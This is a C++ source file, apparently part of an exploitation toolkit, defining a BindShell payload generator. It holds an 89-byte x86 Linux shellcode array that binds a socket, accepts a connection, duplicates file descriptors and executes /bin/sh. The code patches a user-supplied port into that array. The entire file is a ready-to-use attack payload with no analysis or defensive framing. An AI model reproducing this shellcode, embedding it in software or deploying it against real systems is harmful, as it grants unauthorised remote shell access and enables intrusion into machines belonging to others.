#include "Payloads/BindShell/BindShell.hpp"

uint8_t* BindShell::getPayload(size_t* length, argparse::ArgumentParser program)
{
    uint16_t port = (uint16_t)program.get<int>("--shell-port");

    size_t len = 89;
    if (length != nullptr)
        *length = len;
    
    uint8_t payload[] = {
        0x6a, 0x66, 0x58, 0x6a, 0x01, 0x5b, 0x31, 0xf6, 0x56, 0x53, 0x6a, 0x02, 0x89, 0xe1, 0xcd, 0x80,
        0x5f, 0x97, 0x93, 0xb0, 0x66, 0x56, 0x66, 0x68, 0x05, 0x39, 0x66, 0x53, 0x89, 0xe1, 0x6a, 0x10,
        0x51, 0x57, 0x89, 0xe1, 0xcd, 0x80, 0xb0, 0x66, 0xb3, 0x04, 0x56, 0x57, 0x89, 0xe1, 0xcd, 0x80,
        0xb0, 0x66, 0x43, 0x56, 0x56, 0x57, 0x89, 0xe1, 0xcd, 0x80, 0x59, 0x59, 0xb1, 0x02, 0x93, 0xb0,
        0x3f, 0xcd, 0x80, 0x49, 0x79, 0xf9, 0xb0, 0x0b, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62,
        0x69, 0x6e, 0x89, 0xe3, 0x41, 0x89, 0xca, 0xcd, 0x80,
    };

    payload[24] = ((port >> (8* 1)) & 0xff); // Port High
    payload[25] = ((port >> (8* 0)) & 0xff); // Port Low

    uint8_t* buffer = new uint8_t[len];
    memcpy(buffer, payload, len);
    return buffer;
}